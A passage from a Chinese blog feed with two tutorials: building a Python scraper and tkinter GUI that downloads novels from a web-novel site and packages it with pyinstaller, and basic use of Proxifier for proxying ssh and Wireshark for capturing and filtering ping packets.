headers请求头内含User-Agent，Accept，Cookie三个可以确保请求到网页内容</p><p>3，下载单张小说，创建novel1.py，封装一个输入小说下载地址和小说名称，会保存到本地novels文件夹下为：小说名称.txt文件，其中调用一个方法检查目录下是否有novels文件夹，若没有则进行创建：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 下载单张小说</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> novel5</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">download_chapters</span>(<span class="params">url,name</span>):</span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.text</span><br><span class="line">    <span class="comment"># 检查响应的编码类型</span></span><br><span class="line">    encoding = response.encoding</span><br><span class="line">    <span class="comment"># 如果不是UTF-8，则将内容转换为UTF-8</span></span><br><span class="line">    <span class="keyword">if</span> encoding != <span class="string">&#x27;utf-8&#x27;</span>:</span><br><span class="line">        contect = contect.encode(encoding).decode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到标题</span></span><br><span class="line">    title=tree.xpath(<span class="string">&#x27;//h1/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;下载&#x27;</span>+title)</span><br><span class="line">    <span class="comment"># 拿到正文内容</span></span><br><span class="line">    content=tree.xpath(<span class="string">&#x27;//div[@id=&quot;content&quot;]/text()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 去掉多余字符，只保留中文文本内容</span></span><br><span class="line">    content=<span class="string">&#x27;\n&#x27;</span>.join([para.strip() <span class="keyword">for</span> para <span class="keyword">in</span> content])</span><br><span class="line">    dir_name=get_novels()</span><br><span class="line">    path=dir_name+<span class="string">&#x27;/novels/&#x27;</span>+name+<span class="string">&#x27;.txt&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(path)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path,mode=<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        fp.write(title)</span><br><span class="line">        fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        fp.write(content)</span><br><span class="line">        fp.write(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">    <span class="comment"># 将路径赋值给novel5的某个属性或方法</span></span><br><span class="line">    novel5.path = path</span><br><span class="line"> </span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_novels</span>():</span><br><span class="line">    <span class="comment"># 获取当前文件所在的目录的路径</span></span><br><span class="line">    current_dir = os.path.dirname(__file__)</span><br><span class="line">    <span class="comment"># 获取当前文件夹名称</span></span><br><span class="line">    dir_name = os.path.basename(current_dir)</span><br><span class="line">    <span class="comment"># 检查novels文件夹是否存在</span></span><br><span class="line">    novels_dir = os.path.join(current_dir, <span class="string">&#x27;novels&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(novels_dir):</span><br><span class="line">        <span class="comment"># 如果不存在，创建novels文件夹</span></span><br><span class="line">        os.makedirs(novels_dir)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;创建novels文件夹&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> dir_name</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用xpath获取小说的章节标题和各章的内容,下载完成后将路径发送给novel5</p><p>4，按照小说目录下载整本小说，创建novel2.py，封装一个输入小说的目录地址，调用novel1中的方法下载各章小说：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 按照小说目录下载整本小说</span></span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">import</span> novel1</span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_novel</span>(<span class="params">url</span>):   </span><br><span class="line">    <span class="comment"># url=&#x27;http://www.yetianlian.cc/yt78909/&#x27;</span></span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到标题</span></span><br><span class="line">    name=tree.xpath(<span class="string">&#x27;//h2/text()&#x27;</span>)[<span class="number">0</span>]</span><br><span class="line">    <span class="comment"># 拿到各章地址</span></span><br><span class="line">    url_list=tree.xpath(<span class="string">&#x27;//div[@class=&quot;listmain&quot;]//a/@href&#x27;</span>)</span><br><span class="line">    url_list=url_list[<span class="number">12</span>:]</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;下载小说：&#x27;</span>+name)</span><br><span class="line">    <span class="keyword">for</span> base_url <span class="keyword">in</span> url_list:</span><br><span class="line">        url=<span class="string">&#x27;http://www.yetianlian.cc&#x27;</span>+base_url</span><br><span class="line">        novel1.download_chapters(url=url,name=name)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用xpath获取小说的名称和各章的地址</p><p>5，搜索功能，创建novel3.py，封装一个获取小说名称，调用网站的搜索接口，返回搜索结果的方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索功能</span></span><br><span class="line"><span class="keyword">import</span> novel0</span><br><span class="line"><span class="keyword">from</span> lxml <span class="keyword">import</span> etree</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"><span class="keyword">import</span> prettytable <span class="keyword">as</span> pt</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">search</span>(<span class="params">novel_name</span>):</span><br><span class="line">    url=<span class="string">&#x27;http://www.yetianlian.cc/s.php?ie=utf-8&amp;q=&#x27;</span></span><br><span class="line">    url=url+quote(novel_name)</span><br><span class="line">    response=novel0.get_response(url)</span><br><span class="line">    contect=response.content.decode(<span class="string">&#x27;utf-8&#x27;</span>, <span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line">    tree=etree.HTML(contect)</span><br><span class="line">    <span class="comment"># 拿到搜索内容</span></span><br><span class="line">    <span class="comment"># 小说地址</span></span><br><span class="line">    address_list=tree.xpath(<span class="string">&#x27;//h4[@class=&quot;bookname&quot;]/a/@href&#x27;</span>)</span><br><span class="line">    <span class="comment"># 小说名称</span></span><br><span class="line">    names_list=tree.xpath(<span class="string">&#x27;//h4[@class=&quot;bookname&quot;]/a/text()&#x27;</span>)</span><br><span class="line">    <span class="comment"># 小说作者</span></span><br><span class="line">    authors_list=tree.xpath(<span class="string">&#x27;//div[@class=&quot;author&quot;]/text()&#x27;</span>)</span><br><span class="line">    authors_list=[item.replace(<span class="string">&#x27;作者：&#x27;</span>, <span class="string">&#x27;&#x27;</span>) <span class="keyword">for</span> item <span class="keyword">in</span> authors_list]</span><br><span class="line">    <span class="comment"># 设置列表</span></span><br><span class="line">    novels_info=[]</span><br><span class="line">    <span class="comment"># 创建好看的表格</span></span><br><span class="line">    tb=pt.PrettyTable()</span><br><span class="line">    tb.field_names=[<span class="string">&#x27;序号&#x27;</span>,<span class="string">&#x27;书名&#x27;</span>,<span class="string">&#x27;作者&#x27;</span>,<span class="string">&#x27;下载地址&#x27;</span>]</span><br><span class="line">    num=<span class="number">1</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(names_list)):</span><br><span class="line">        info=&#123;</span><br><span class="line">            <span class="string">&#x27;name&#x27;</span>:names_list[i],</span><br><span class="line">            <span class="string">&#x27;author&#x27;</span>:authors_list[i],</span><br><span class="line">            <span class="string">&#x27;address&#x27;</span>:address_list[i]</span><br><span class="line">        &#125;</span><br><span class="line">        tb.add_row([num,names_list[i],authors_list[i],address_list[i]])</span><br><span class="line">        novels_info.append(info)</span><br><span class="line">    <span class="built_in">print</span>(tb)</span><br><span class="line">    <span class="keyword">return</span> novels_info</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其中，用xpath获取网站的搜索结果包括小说的名称，作者和下载地址，prettytable是整齐好看的表格，让结果整齐的在控制台中打印出来</p><p>6，GUI图形化窗口，创建novel4.py，封装一个创建图形化窗口的方法，该窗口中包括两个标签（名称&#x2F;作者，序号）和与之对应的输入框和按钮和一个表格，表格分为序号，书名，作者和下载地址四列：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 图形主页面</span></span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"><span class="keyword">from</span> tkinter <span class="keyword">import</span> ttk</span><br><span class="line"><span class="keyword">import</span> novel5</span><br><span class="line"><span class="comment"># 创建窗口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_window</span>():</span><br><span class="line">    root=tk.Tk()</span><br><span class="line">    <span class="comment"># 设置窗口标题</span></span><br><span class="line">    root.title(<span class="string">&#x27;小说下载器&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置窗口的大小（长400px，宽300px）</span></span><br><span class="line">    root.geometry(<span class="string">&quot;500x400&quot;</span>)</span><br><span class="line">    <span class="comment"># 获取屏幕的宽度和高度</span></span><br><span class="line">    screen_width = root.winfo_screenwidth()</span><br><span class="line">    screen_height = root.winfo_screenheight()</span><br><span class="line">    <span class="comment"># 计算窗口在屏幕上的位置（居中）</span></span><br><span class="line">    x_pos = <span class="built_in">int</span>((screen_width / <span class="number">2</span>) - (<span class="number">500</span> / <span class="number">2</span>))</span><br><span class="line">    y_pos = <span class="built_in">int</span>((screen_height / <span class="number">2</span>) - (<span class="number">400</span> / <span class="number">2</span>))</span><br><span class="line">    <span class="comment"># 使用geometry()函数设置窗口的位置和大小</span></span><br><span class="line">    root.geometry(<span class="string">&quot;+&#123;&#125;+&#123;&#125;&quot;</span>.<span class="built_in">format</span>(x_pos, y_pos))</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个书名的标签</span></span><br><span class="line">    lable_shuming=tk.Frame(root)</span><br><span class="line">    lable_shuming.pack(pady=<span class="number">15</span>,fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    lab_shum=tk.Label(lable_shuming,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">15</span>),text=<span class="string">&#x27;书名/作者&#x27;</span>)</span><br><span class="line">    lab_shum.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置书名/作者输入框的变量</span></span><br><span class="line">    name_var=tk.StringVar()</span><br><span class="line">    ent_shuming=tk.Entry(lable_shuming,relief=<span class="string">&#x27;flat&#x27;</span>,textvariable=name_var)</span><br><span class="line">    ent_shuming.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    btn_shuming=tk.Button(lable_shuming,command=<span class="keyword">lambda</span>:novel5.sosuo(name_var,tree_view),text=<span class="string">&#x27;搜索&#x27;</span>,bg=<span class="string">&#x27;#00BFFF&#x27;</span>,fg=<span class="string">&#x27;#FFFFFF&#x27;</span>,width=<span class="number">4</span>,height=<span class="number">1</span>,activebackground=<span class="string">&#x27;#00BFFF&#x27;</span>,activeforeground=<span class="string">&#x27;#00BFFF&#x27;</span>,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">11</span>))</span><br><span class="line">    btn_shuming.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 创建一个选择序号的标签</span></span><br><span class="line">    lable_number=tk.Frame(root)</span><br><span class="line">    lable_number.pack(pady=<span class="number">5</span>,fill=<span class="string">&#x27;x&#x27;</span>)</span><br><span class="line">    lab_num=tk.Label(lable_number,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">15</span>),text=<span class="string">&#x27; 选择序号&#x27;</span>)</span><br><span class="line">    lab_num.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置序号输入框的变量</span></span><br><span class="line">    num_var=tk.StringVar()</span><br><span class="line">    ent_number=tk.Entry(lable_number,relief=<span class="string">&#x27;flat&#x27;</span>,textvariable=num_var)</span><br><span class="line">    ent_number.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    btn_number=tk.Button(lable_number,command=<span class="keyword">lambda</span>:novel5.down(num_var,root),text=<span class="string">&#x27;下载&#x27;</span>,bg=<span class="string">&#x27;#00BFFF&#x27;</span>,fg=<span class="string">&#x27;#FFFFFF&#x27;</span>,width=<span class="number">4</span>,height=<span class="number">1</span>,activebackground=<span class="string">&#x27;#00BFFF&#x27;</span>,activeforeground=<span class="string">&#x27;#00BFFF&#x27;</span>,font=(<span class="string">&#x27;微软雅黑&#x27;</span>,<span class="number">11</span>))</span><br><span class="line">    btn_number.pack(side=<span class="string">&#x27;left&#x27;</span>,padx=<span class="number">10</span>)</span><br><span class="line">    <span class="comment"># 设置搜索显示表</span></span><br><span class="line">    columns=(<span class="string">&#x27;novle_id&#x27;</span>,<span class="string">&#x27;novle_name&#x27;</span>,<span class="string">&#x27;novle_author&#x27;</span>,<span class="string">&#x27;novle_address&#x27;</span>)</span><br><span class="line">    tree_view=ttk.Treeview(root,height=<span class="number">18</span>,columns=columns,show=<span class="string">&#x27;headings&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置每列格式</span></span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_id&#x27;</span>,width=<span class="number">25</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_name&#x27;</span>,width=<span class="number">55</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_author&#x27;</span>,width=<span class="number">40</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    tree_view.column(<span class="string">&#x27;novle_address&#x27;</span>,width=<span class="number">40</span>,anchor=<span class="string">&#x27;center&#x27;</span>)</span><br><span class="line">    <span class="comment"># 设置每列表头</span></span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_id&#x27;</span>,text=<span class="string">&#x27;序号&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_name&#x27;</span>,text=<span class="string">&#x27;书名&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_author&#x27;</span>,text=<span class="string">&#x27;作者&#x27;</span>)</span><br><span class="line">    tree_view.heading(<span class="string">&#x27;novle_address&#x27;</span>,text=<span class="string">&#x27;下载地址&#x27;</span>)</span><br><span class="line">    tree_view.pack(side=<span class="string">&#x27;left&#x27;</span>,fill=<span class="string">&#x27;both&#x27;</span>,expand=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">return</span> root</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>点击按钮后，将输入框的值发送给novel5执行</p><p>7，主方法，创建novel5.py，在该方法中将之前的功能串联起来：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 主方法</span></span><br><span class="line"><span class="keyword">import</span> novel4</span><br><span class="line"><span class="keyword">import</span> novel3</span><br><span class="line"><span class="keyword">import</span> novel2</span><br><span class="line"><span class="keyword">import</span> tkinter <span class="keyword">as</span> tk</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    path=<span class="string">&#x27;&#x27;</span></span><br><span class="line">    root=novel4.get_window()</span><br><span class="line">    root.mainloop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击搜索</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sosuo</span>(<span class="params">name_var,tree_view</span>):</span><br><span class="line">    name=name_var.get()</span><br><span class="line">    <span class="keyword">global</span> novels_info</span><br><span class="line">    novels_info=novel3.search(name)</span><br><span class="line">    <span class="comment"># 插入novels_info中的数据</span></span><br><span class="line">    <span class="keyword">for</span> i, novel_info <span class="keyword">in</span> <span class="built_in">enumerate</span>(novels_info):</span><br><span class="line">        values = [i, novel_info[<span class="string">&#x27;name&#x27;</span>], novel_info[<span class="string">&#x27;author&#x27;</span>], novel_info[<span class="string">&#x27;address&#x27;</span>]]</span><br><span class="line">        tree_view.insert(<span class="string">&#x27;&#x27;</span>, <span class="string">&#x27;end&#x27;</span>, values=values)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 在主窗口上弹出新窗口</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">open_new_window</span>(<span class="params">message,root</span>):</span><br><span class="line">    new_window = tk.Toplevel(root)</span><br><span class="line">    new_window.title(<span class="string">&quot;小说下载器&quot;</span>)</span><br><span class="line">    new_window.geometry(<span class="string">&quot;350x100+650+400&quot;</span>)</span><br><span class="line">    label = tk.Label(new_window, text=message)</span><br><span class="line">    label.pack()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 点击下载</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">down</span>(<span class="params">num_var,root</span>):</span><br><span class="line">    num=<span class="built_in">int</span>(num_var.get())</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> num&lt;<span class="number">0</span> <span class="keyword">or</span> num&gt;<span class="built_in">len</span>(novels_info):</span><br><span class="line">            message=<span class="string">&#x27;输入的序号错误！&#x27;</span></span><br><span class="line">            open_new_window(message,root)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            address = <span class="string">&#x27;http://www.yetianlian.cc&#x27;</span>+novels_info[num][<span class="string">&#x27;address&#x27;</span>]</span><br><span class="line">            novel2.get_novel(address)</span><br><span class="line">            message=<span class="string">&#x27;下载完成！\n 小说下载到：&#x27;</span>+path</span><br><span class="line">            open_new_window(message,root)     </span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        message=<span class="string">&#x27;下载失败！&#x27;</span></span><br><span class="line">        open_new_window(message,root)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>8,运行效果</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082114588.png" alt="image-20231208204704551" style="zoom:67%;" /><p>搜索功能：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082115144.png" alt="image-20231208204802038" style="zoom:67%;" /><p>下载功能：</p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082115654.png" alt="image-20231208205131466" style="zoom:67%;" /><p>下载的文件：</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082116465.png" alt="image-20231208205206240"></p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082116076.png" alt="image-20231208205230920" style="zoom:67%;" /><p>9，打包为exe可执行文件<br>cmd 进入项目的文件夹内</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pyinstaller -D -w -i box.ico -n &quot;小说下载器&quot; novel5.py</span><br><span class="line">-D表示打包为文件夹</span><br><span class="line">-w表示可在Windows系统中使用</span><br><span class="line">-i box.ico表示选择当前文件夹下的box.ico图片当做程序的图标</span><br><span class="line">-n &quot;小说下载器&quot; 表示程序的名称为：小说下载器</span><br><span class="line">novel5.py该项目的主程序入口</span><br></pre></td></tr></table></figure><p>打包完成为：build,dist两个文件夹</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082117103.png" alt="image-20231208205911547"></p><p>其中exe程序就在dist的文件夹下</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312082118594.png" alt="image-20231208210019441"></p><p>至此，整个python爬虫的小说下载器项目就制作完成！</p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;​		用python爬虫制作一个爬取笔趣阁网站小说并且下载的程序，以下是 详细步骤：&lt;/p&gt;
&lt;p&gt;1，先下载该程序所需的库：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pr</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十四，Proxifier和Wireshark的使用</title>
    <link href="http://example.com/2023/12/05/%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%8CProxifier%E5%92%8CWireshark%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
    <id>http://example.com/2023/12/05/%E4%BA%8C%E5%8D%81%E5%9B%9B%EF%BC%8CProxifier%E5%92%8CWireshark%E7%9A%84%E4%BD%BF%E7%94%A8/</id>
    <published>2023-12-05T11:23:38.000Z</published>
    <updated>2023-12-05T12:09:31.262Z</updated>
    
    <content type="html"><![CDATA[<h4 id="一，Proxifier的使用"><a href="#一，Proxifier的使用" class="headerlink" title="一，Proxifier的使用"></a>一，Proxifier的使用</h4><p>​Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p><p>1，下载安装Proxifier，官网地址为：<a href="https://www.proxifier.com/">https://www.proxifier.com/</a></p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051933548.png" alt="image-20231205193345581" style="zoom: 80%;" /><p>2，双击运行Proxifier</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051936640.png" alt="image-20231205193621432"></p><p>3，点击配置文件—&gt;点击代理服务器—&gt;点击添加—&gt;地址填127.0.0.1—&gt;端口填自己代理的端口—&gt;选中SOCKES 版本 5—&gt;点击确定—&gt;点击确定</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051940358.png" alt="image-20231205194010239"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051941649.png" alt="image-20231205194102379"></p><p>4，点击配置文件—&gt;点击代理规则—&gt;点击添加—&gt;名称随意填—&gt;应用程序填想要添加代理的程序或服务，例如：ssh*;—&gt;点击确定—&gt;移除Location—&gt;将Default的最后一格改为Direct—&gt;点击确定</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051944093.png" alt="image-20231205194430704"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051946528.png" alt="image-20231205194615312"></p><p>5，打开命令提示符，输入：ssh <a href="mailto:&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;">&#x72;&#x6f;&#x6f;&#x74;&#64;&#49;&#x2e;&#49;&#x2e;&#x31;&#x2e;&#x31;</a>，返回Proxifier出现以下效果，说明代理成功</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051950439.png" alt="image-20231205195024403"></p><h4 id="二，Wireshark的使用"><a href="#二，Wireshark的使用" class="headerlink" title="二，Wireshark的使用"></a>二，Wireshark的使用</h4><p>​WireShark是非常流行的网络封包分析工具，可以截取各种网络数据包，并显示数据包详细信息。常用于开发测试过程中各种问题定位。</p><p>1，下载WireShark，官网地址为：<a href="https://www.wireshark.org/">https://www.wireshark.org/</a></p><p>下载时能勾上下载的插件全部都要勾上下载下来，包括其中的Npcap和USBPcap组件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051956891.png" alt="image-20231205195616935"></p><p>2，找到本机的网卡并双击选择</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312051958979.png" alt="image-20231205195830437"></p><p>3，打开命令提示符，输入ping 192.168.2.56,发送和接收四个数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052000693.png" alt="image-20231205200010210"></p><p>4，在WireShark中点击停止，停止监控数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052001054.png" alt="image-20231205200123126"></p><p>5，在搜索框中输入icmp，查看ping的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052002568.png" alt="image-20231205200251634"></p><p>6.，在搜索框中输入ip.src&#x3D;&#x3D;192.168.2.96则可以查看源地址为192.168.2.96的数据包</p><p>输入ip.dst&#x3D;&#x3D;192.168.2.56则可以查看目标地址为192.168.2.56的数据包</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312052008367.png" alt="image-20231205200848249"></p><hr>]]></content>
    
    
      
      
